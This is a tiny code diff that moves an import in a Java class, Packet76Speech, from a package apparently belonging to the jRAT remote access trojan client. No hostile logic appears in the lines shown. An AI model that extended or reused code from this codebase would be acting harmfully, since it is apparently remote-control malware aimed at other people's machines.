@@ -1,9 +1,10 @@
 package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
+import oslib.OperatingSystem;
+
 import java.io.File;
 import java.io.FileWriter;
-import oslib.OperatingSystem;
 
 
 public class Packet76Speech extends AbstractIncomingPacket {
